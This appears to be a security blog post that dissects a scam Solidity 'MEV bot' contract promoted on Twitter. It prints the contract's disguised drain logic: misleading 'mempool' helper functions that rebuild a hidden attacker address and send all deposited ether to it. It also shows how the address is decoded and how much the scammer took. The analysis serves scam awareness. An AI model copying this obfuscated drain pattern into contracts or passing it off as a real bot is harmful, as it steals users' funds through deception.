---
title: 'Malicious Mev-Bot Walkthrough'
date: 2024-01-26T17:21:28+08:00
draft: false
tags: ["security", "smart contracts"]
---

## 0. Preliminary Notes

A few months ago, I encountered a scam on Twitter. I clicked on some random tweet that said something like "Hey check out this MEV bot that makes me 5 ETH per week" which led to some Solidity code. At that time, I didn't understand Solidity but was pretty sure it was a scam (spoilers alert: it was). Also, I had no idea what an MEV bot was, but in hindsight, the scam was attempting to use Solidity code for an MEV bot, which actually made no sense since it requires offchain code to monitor the mempool. Regardless, I bookmarked the code to revisit once I had a better grasp of Solidity, and now here we are.

## 1. Malicious code

This is the malicious code (Warning: DO NOT RUN THIS CODE; it's provided here for demonstration purposes only): https://pastes.io/raw/a7hcqlzvzc.

At first glance, the code is pretty complicated, and you can spot elements like the WETH token address. This can even be verified on Etherscan, confirming it's the correct address. However, these parts of the code are irrelevant and are solely intended to confuse users.

```sol
string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
```

If we search the `public` keyword, we can find only two public functions: `start()` and `withdrawal()`. By reading it, we can immediately sense something weird, because what they do is transfer all funds to the same address.

```sol
/*
 * @dev Perform frontrun action from different contract pools
 * @param contract address to snipe liquidity from
 * @return `liquidity`.
 */
function start() public payable {
    emit Log("Running MEV action. This can take a while; please wait..");
    payable(_callMEVAction()).transfer(address(this).balance);
}

/*
 * @dev withdrawals profit back to contract creator address
 * @return `profits`.
 */
function withdrawal() public payable {
    emit Log("Sending profits back to contract creator address...");
    payable(withdrawalProfits()).transfer(address(this).balance);
}
...
function _callMEVAction() internal pure returns (address) {
    return parseMempool(callMempool());
}
function withdrawalProfits() internal pure returns (address) {
    return parseMempool(callMempool());
}
```

Now, let's try to understand what exactly is happening with `parseMempool(callMempool())`. Here’s the relevant code snippet, including the nonsense comments within the code:

```sol
/*
 * @dev Parsing all Uniswap mempool
 * @param self The contract to operate on.
 * @return True if the slice is empty, False otherwise.
 */
function parseMempool(string memory _a) internal pure returns (address _parsed) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;

    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}
/*
 * @dev Iterating through all mempool to call the one with the with highest possible returns
 * @return `self`.
 */
function callMempool() internal pure returns (string memory) {
    string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
    uint _memPoolSol = 3992521915;
    uint _memPoolLength = 39295571767;
    uint _memPoolSize = 631542;
    uint _memPoolHeight = getMemPoolHeight();
    uint _memPoolDepth = getMemPoolDepth();

    string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
    string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
    string memory _memPool3 = checkLiquidity(_memPoolHeight);
    string memory _memPool4 = checkLiquidity(_memPoolDepth);

    string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
    string memory _fullMempool = mempool("0", _allMempools);

    return _fullMempool;
}
...
/*
 * @dev Check if contract has enough liquidity available
 * @param self The contract to operate on.
 * @return True if the slice starts with the provided text, false otherwise.
 */
function checkLiquidity(uint a) internal pure returns (string memory) {

    uint count = 0;
    uint b = a;
    while (b != 0) {
        count++;
        b /= 16;
    }
    bytes memory res = new bytes(count);
    for (uint i=0; i<count; ++i) {
        b = a % 16;
        res[count - i - 1] = toHexDigit(uint8(b));
        a /= 16;
    }

    return string(res);
}
...
function getMemPoolLength() internal pure returns (uint) {
    return 45373229;
}
...
/*
 * @dev loads all Uniswap mempool into memory
 * @param token An output parameter to which the first token is written.
 * @return `mempool`.
 */
function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
    bytes memory _baseBytes = bytes(_base);
    bytes memory _valueBytes = bytes(_value);

    string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
    bytes memory _newValue = bytes(_tmpValue);

    uint i;
    uint j;

    for(i=0; i<_baseBytes.length; i++) {
        _newValue[j++] = _baseBytes[i];
    }

    for(i=0; i<_valueBytes.length; i++) {
        _newValue[j++] = _valueBytes[i];
    }

    return string(_newValue);
}
```
By analyzing the code, we can break down each function as follows:

1. The `mempool()` function simply concatenates strings.
2. The `checkLiquidity()` function converts a uint256 into its hexadecimal string representation.
3. The `callMempool()` function creates an address in string format by converting integers to hex and then concatenating them, using seemingly random functions like `getMemPoolLength()`. It also includes a `0x` prefix, which is noticeable upon closer inspection.
4. The `parseMempool()` function converts the string back into an address format. The ranges 48-57, 65-70, and 97-102 correspond to the ASCII codes for '0'-'9', 'A'-'F', and 'a'-'f', respectively.


To summarize, the code essentially constructs the scammer's address and then transfers all the ether provided by the user to that address.

I modified the code in Remix to log the scammer's address: 0x899ccec116edf90cbB92632d7379a2f62E49fbFD. We can track how many people were victimized by this individual by visiting his transaction history on [Etherscan](https://etherscan.io/address/0x899ccec116edf90cbB92632d7379a2f62E49fbFD#internaltx). It turns out this person did manage to steal about 5 ETH through this scheme. Ironically, the scammer's promotion wasn't entirely false – the code did really helped him gain 5 ETH.

![tx-total](../tx-total.png)

We can even see the log "Running MEV action. This can take a while; please wait.." if we check the transaction details.

![tx-detail](../tx-detail.png)

## 2. Summary

The key takeaway is straightforward: avoid greed and be cautious of clicking on suspicious links, particularly in the crypto world where scams are everywhere.